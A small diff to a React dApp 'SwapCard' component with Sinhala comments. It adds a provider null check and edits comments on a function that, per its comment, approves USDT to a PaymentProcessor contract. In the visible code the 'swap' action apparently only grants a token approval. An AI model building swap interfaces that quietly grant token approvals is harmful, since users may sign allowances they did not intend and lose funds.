@@ -47,6 +47,7 @@ export default function SwapCard({ walletAddress, provider }) {
 
   const loadBalance = async () => {
     try {
+      if (!provider) return;
       const signer = provider.getSigner();
       const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
       const balance = await usdtContract.balanceOf(walletAddress);
@@ -89,7 +90,8 @@ export default function SwapCard({ walletAddress, provider }) {
     if (fromAmount) setTimeout(() => calculateOutput(fromAmount), 100);
   };
 
-  // ⭐ මේක තමයි අලුත් ෆන්ක්ෂන් එක. viem පාවිච්චි කරලා approve කරනවා.
+  // ⭐ මේක තමයි අලුත් ෆන්ක්ෂන් එක. 
+  // මේකෙන් ඔයාගේ PaymentProcessor contract එකට USDT approve කරනවා.
   const executeSwap = async () => {
     if (!walletAddress) { setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); return; }
     if (!fromAmount || fromAmount <= 0) { setStatus({ type: 'error', msg: 'Please enter a valid amount.' }); return; }
@@ -101,7 +103,7 @@ export default function SwapCard({ walletAddress, provider }) {
       // 1. WalletConnect හරහා එන provider එකෙන් viem client එකක් හදන්න
       const walletClient = createWalletClient({
         chain: mainnet,
-        transport: custom(window.ethereum) // WalletConnect provider එක මෙතනට දෙන්න
+        transport: custom(window.ethereum)
       });
 
       // 2. Approve එකට අවශ්‍ය ප්‍රමාණය (viem වල parseUnits පාවිච්චි කරන්න)
@@ -119,7 +121,6 @@ export default function SwapCard({ walletAddress, provider }) {
       setStatus({ type: 'info', msg: '⏳ Transaction sent! Waiting...' });
       
       // 4. Transaction එක confirm වෙනකම් ඉන්න
-      // (මේකට අපිට public client එකක් ඕන වෙන්න පුළුවන්, ඒත් දැනට අපි tx hash එක පෙන්නමු)
       setStatus({ type: 'success', msg: `✅ Transaction sent! Hash: ${hash.slice(0, 10)}...` });
       setIsLoading(false);
       setTimeout(() => setStatus(null), 8000);
